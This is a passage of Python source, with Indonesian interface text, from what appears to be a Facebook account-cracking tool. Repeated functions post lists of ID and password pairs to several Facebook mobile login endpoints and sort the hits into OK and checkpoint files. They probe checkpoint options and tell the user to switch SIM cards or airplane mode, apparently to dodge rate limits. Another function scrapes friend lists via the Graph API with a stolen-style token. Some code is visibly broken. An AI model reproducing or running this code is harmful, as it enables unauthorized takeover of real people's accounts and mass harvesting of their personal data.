					print('\r%s >> %s|%s >> CP       %s'%(J,id,pw,K))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s >> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(H,B))
					else:
						for opsii in opsi:
							print('\r%s >> %s%s'%(J,opsii.text,H))
				except:
					print('\r%s >> %s|%s >> CP       %s'%(J,id,pw,K))
					print('\r%s>_Tidak Dapat Mengecek Opsi%s'%(B,M))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s >> %s|%s >> OK       %s'%(H,id,pw,K))
			else:
				print('\r%s >>%s|%s  >> SALAH       %s'%(H,id,pw,M))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Koneksi Internet Bermasalah') 
			exit()
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Beres') 
	exit()

def mobil():
	file()
	motor()
def motor():
	c = len(akun)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)) 
	input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Mulai')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Proses Check Dimulai') 
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s >> %s >> Error      %s'%(K,kes,M))
				print('\r%s>_ Pemisah Tidak Didukung Untuk Program Ini%s'%(J,M))
				continue
			bi = random.choice([K,P,H,M,J,B])
			print('\r%s >> %s/%s >> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://m.facebook.com')
			ho = parser(ses.post('https://m.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = parser(ses.post('https://m.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s >> %s|%s >> CP       %s'%(J,id,pw,K))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s >> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(H,B))
					else:
						for opsii in opsi:
							print('\r%s >> %s%s'%(J,opsii.text,H))
				except:
					print('\r%s >> %s|%s >> CP       %s'%(J,id,pw,K))
					print('\r%s>_Tidak Dapat Mengecek Opsi%s'%(B,M))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s >> %s|%s >> OK       %s'%(H,id,pw,K))
			else:
				print('\r%s >>%s|%s  >> SALAH       %s'%(H,id,pw,M))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Koneksi Internet Bermasalah') 
			exit()
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Beres') 
	exit()

def tuh():
	file()
	tah()
def tah():
	c = len(akun)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)) 
	input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Mulai')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Proses Check Dimulai') 
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s >> %s >> Error      %s'%(K,kes,M))
				print('\r%s>_ Pemisah Tidak Didukung Untuk Program Ini%s'%(J,M))
				continue
			bi = random.choice([K,P,H,M,J,B])
			print('\r%s >> %s/%s >> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "touch.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://touch.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://touch.facebook.com')
			ho = parser(ses.post('https://touch.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = parser(ses.post('https://touch.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s >> %s|%s >> CP       %s'%(J,id,pw,K))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s >> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(H,B))
					else:
						for opsii in opsi:
							print('\r%s >> %s%s'%(J,opsii.text,H))
				except:
					print('\r%s >> %s|%s >> CP       %s'%(J,id,pw,K))
					print('\r%s>_Tidak Dapat Mengecek Opsi%s'%(B,M))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s >> %s|%s >> OK       %s'%(H,id,pw,K))
			else:
				print('\r%s >>%s|%s  >> SALAH       %s'%(H,id,pw,M))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Koneksi Internet Bermasalah') 
			exit()
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Beres') 
	exit()

def momok():
	file()
	mmek()
def mmek():
	c = len(akun)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)) 
	input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Mulai')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Proses Check Dimulai') 
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s >> %s >> Error      %s'%(K,kes,M))
				print('\r%s>_ Pemisah Tidak Didukung Untuk Program Ini%s'%(J,M))
				continue
			bi = random.choice([K,P,H,M,J,B])
			print('\r%s >> %s/%s >> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https:/mbasic.facebook.com')
			ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s >> %s|%s >> CP       %s'%(J,id,pw,K))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s >> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(H,B))
					else:
						for opsii in opsi:
							print('\r%s >> %s%s'%(J,opsii.text,H))
				except:
					print('\r%s >> %s|%s >> CP       %s'%(J,id,pw,K))
					print('\r%s>_Tidak Dapat Mengecek Opsi%s'%(B,M))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s >> %s|%s >> OK       %s'%(H,id,pw,K))
			else:
				print('\r%s >>%s|%s  >> SALAH       %s'%(H,id,pw,M))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Koneksi Internet Bermasalah') 
			exit()
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Beres') 
	exit()


def xxx():
	c = len(akun)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)) 
	input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Mulai')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Proses Check Dimulai') 
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s >> %s >> Error      %s'%(K,kes,M))
				print('\r%s>_ Pemisah Tidak Didukung Untuk Program Ini%s'%(J,M))
				continue
			bi = random.choice([K,P,H,M,J,B])
			print('\r%s >> %s/%s >> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "x.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://x.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://x.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://x.facebook.com')
			ho = parser(ses.post('https://x.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = parser(ses.post('https://x.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s >> %s|%s >> CP       %s'%(J,id,pw,K))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s >> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(H,B))
					else:
						for opsii in opsi:
							print('\r%s >> %s%s'%(J,opsii.text,H))
				except:
					print('\r%s >> %s|%s >> CP       %s'%(J,id,pw,K))
					print('\r%s>_Tidak Dapat Mengecek Opsi%s'%(B,M))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s >> %s|%s >> OK       %s'%(H,id,pw,K))
			else:
				print('\r%s >>%s|%s  >> SALAH       %s'%(H,id,pw,M))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Koneksi Internet Bermasalah') 
			exit()
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Beres') 
	exit()

def ril():
	c = len(akun)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)) 
	input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Mulai')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Proses Check Dimulai') 
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s >> %s >> Error      %s'%(K,kes,M))
				print('\r%s>_ Pemisah Tidak Didukung Untuk Program Ini%s'%(J,M))
				continue
			bi = random.choice([K,P,H,M,J,B])
			print('\r%s >> %s/%s >> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "free.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://free.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://free.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://free.facebook.com')
			ho = parser(ses.post('https://free.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = parser(ses.post('https://free.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s >> %s|%s >> CP       %s'%(J,id,pw,K))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s >> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(H,B))
					else:
						for opsii in opsi:
							print('\r%s >> %s%s'%(J,opsii.text,H))
				except:
					print('\r%s >> %s|%s >> CP       %s'%(J,id,pw,K))
					print('\r%s>_Tidak Dapat Mengecek Opsi%s'%(B,M))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s >> %s|%s >> OK       %s'%(H,id,pw,K))
			else:
				print('\r%s >>%s|%s  >> SALAH       %s'%(H,id,pw,M))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Koneksi Internet Bermasalah')
			exit()
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Beres') 
	exit()

def result():
	jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Cek Hasil Crack') 
	print('\x1b[0;96m[01] >_Cek Hasil Cp\n[02] >_Cek Hasil Ok\n[00] >_Kembali Ke Menu') 
	kz = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Pilih : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_Tidak Ada Hasil')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_Tidak Ada Hasil')
			time.sleep(2)
			back()
		else:
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;226m>_Hasil Checkpoint') 
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[0;96m>_Pilih Hasil Untuk Ditampilkan')
			geeh = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[0;96m >_Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_Pilihan Tidak Ada') 
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('CP/'+geh,'r').read()
			except:
				jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_File Tidak Ditemukan')
				time.sleep(2)
				back()
			jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_List Akun Checkpoint Kamu') 
			hus = os.system('cd CP && cat '+geh)
			jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_List Akun Checkpoint Kamu') 
			input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[0;96m>_Kembali')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_Direktori Tidak Ditemukan') 
			time.sleep(2)
			back()
		if len(vin)==0:
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_Tidak Ada Hasil OK') 
			time.sleep(2)
			back()
		else:
			jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;46m>_Hasil OK Kamu') 
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
			jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;46m>_Pilih Hasil Untuk Ditampilkan')
			geeh = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;46m>_Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_Pilihan Tidak Ada Dimenu')
				exit()
			try:lin = open('OK/'+geh,'r').read()
			except:
				print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_File Tidak Ditemukan')
				time.sleep(2)
				back()
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_Hasil Akun OK Kamu') 
			hus = os.system('cd OK && cat '+geh)
			jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_Hasil Akun OK Kamu') 
			input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Kembali')
			back()
	elif kz in ['0','00']:
		back()
	else:
		jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;196m>_Pilihan Tidak Ada Dimenu') 
		exit()

def file():
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >\x1b[38;5;208m_Check Opsi')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih File Yang Akan Dicek') 
	my_files = []
	try:
		lis = os.listdir('CP KONTOL')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Tidak Ada Hasil Untuk Dicek') 
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('CP/'+isi,'r').readlines()
			except:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih File Yang Akan Dicek') 
		geeh = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilihan Tidak Ada Dimenu')
			exit()
		try:
			hf = open('CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			bacek()
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				bacek()
			except IOError:
				jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_File Tidak Ditemukan') 
				time.sleep(2)
				back()

def file2():
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >\x1b[38;5;208m_Check Opsi')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih File Yang Akan Dicek') 
	my_files = []
	try:
		lis = os.listdir('CP KONTOL')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Tidak Ada Hasil Untuk Dicek') 
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('CP/'+isi,'r').readlines()
			except:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih File Yang Alan Dicek') 
		geeh = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilihan Tidak Ada Dimenu') 
			exit()
		try:
			hf = open('CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			momok()
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				momok()
			except IOError:
				print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_File Tidak Ditemukan') 
				time.sleep(2)
				back()

def file3():
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >\x1b[38;5;208m_Check Opsi')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih File Yang Akan Dicek') 
	my_files = []
	try:
		lis = os.listdir('CP KONTOL')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Tidak Ada Hasil Untuk Dicek') 
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('CP/'+isi,'r').readlines()
			except:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih File Yang Alan Dicek') 
		geeh = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilihan Tidak Ada Dimenu')
			exit()
		try:
			hf = open('CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			mobil()
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				mobil()
			except IOError:
				print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_File Tidak Ditemukan')
				time.sleep(2)
				back()



def dump_publik():
	global token
	try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	pil = input('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Masukkan ID Facebook : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v4.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('├\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Koneksi Internet Bermasalah') 
		exit()
	except (KeyError,IOError):
		print('└\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;231m>_Pertemanan Private Atau Token Rusak') 
		exit()

def file4():
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >\x1b[38;5;208m_Check Opsi')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih File Yang Akan Dicek') 
	my_files = []
	try:
		lis = os.listdir('CP KONTOL')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Tidak Ada Hasil Untuk Dicek') 
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('CP/'+isi,'r').readlines()
			except:
